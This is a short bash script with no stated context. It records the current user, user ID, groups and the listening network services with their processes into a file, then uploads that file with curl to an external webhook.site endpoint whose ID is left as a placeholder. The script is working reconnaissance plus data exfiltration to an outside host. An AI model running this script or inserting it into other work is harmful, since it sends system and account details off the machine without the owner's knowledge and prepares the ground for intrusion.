#!/bin/bash
{
    echo "=== whoami ==="
    whoami
    echo
    echo "=== id ==="
    id
    echo
    echo "=== groups ==="
    groups
    echo
    echo "=== ss -tulnp ==="
    ss -tulnp
    echo
    echo "=== netstat -tulnp ==="
    netstat -tulnp
} > results.txt 2>&1

curl -s -X POST \
    -H "Content-Type: text/plain" \
    --data-binary @results.txt \
    https://webhook.site/REPLACE_WITH_YOUR_WEBHOOK_ID
